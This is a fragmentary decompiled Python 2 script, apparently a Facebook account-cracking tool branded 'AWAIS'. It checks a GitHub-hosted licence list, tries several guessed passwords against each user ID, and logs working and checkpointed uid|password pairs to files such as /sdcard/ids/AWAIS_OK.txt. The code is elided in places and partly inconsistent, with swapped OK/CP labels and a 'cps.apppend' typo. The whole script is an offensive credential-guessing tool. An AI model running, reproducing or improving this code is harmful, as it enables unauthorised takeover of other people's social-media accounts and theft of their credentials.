# Decompiled By Awais khan
# Github : https://github.com/awaismoman
...
__copyright = 'All rights reserved . Copyright  AWAIS_MOMAND'
...
\033[1;94m         _                  _             _                    _         _        
   ...
   / / /___/ /\ \     / _______/\/ // / /___/ /\ \         / / /      \ \ \       
  / / /_____/ /\ \   / /  \____\  // / /_____/ /\ \       / / /   _    \ \ \      
 / /_________/\ \ \ /_/ /\ \ /\ \// /_________/\ \ \  ___/ / /__ /_/\__/ / /      
/ / /_       __\ \_\\_\//_/ /_/ // / /_       __\ \_\/\__\/_/___\\ \/___/ /       
\_\___\     /____/_/    \_\/\_\/ \_\___\     /____/_/\/_________/ \_____\/                                
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/awaismoman/Filecrack/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923173725015')
        reg()
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mThanks To My Mind Mr-AWAIS\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[AWAIS_OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/AWAIS_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[AWAIS_OK] ' + uid + ' | ' + pass1
                cp = open('AWAIS_OK.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[AWAIS_OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/AWAIS_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[AWAIS_CP] ' + uid + ' | ' + pass2
                    cp = open('AWAIS_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[AWAIS_OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/AWAIS_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[AWAIS_CP] ' + uid + ' | ' + pass3
                        cp = open('AWAIS_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[AWAIS_OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/AWAIS_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[AWAIS_OK] ' + uid + ' | ' + pass4
                            cp = open('AWAIS_OK.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\x1b[1;31;1m[AWAIS_CP] ' + uid + ' | ' + pass1
                cp = open('AWAIS_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;31;1m[AWAIS_OK] ' + uid + ' | ' + pass2
                    cp = open('AWAIS_OK.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[AWAIS_OK] ' + uid + ' | ' + pass3
                        cp = open('AWAIS_OK.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'loc' in q:
                            ...
                            print '\x1b[1;31;1m[AWAIS_CP] ' + uid + ' | ' + pass4
                            cp = open('AWAIS_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
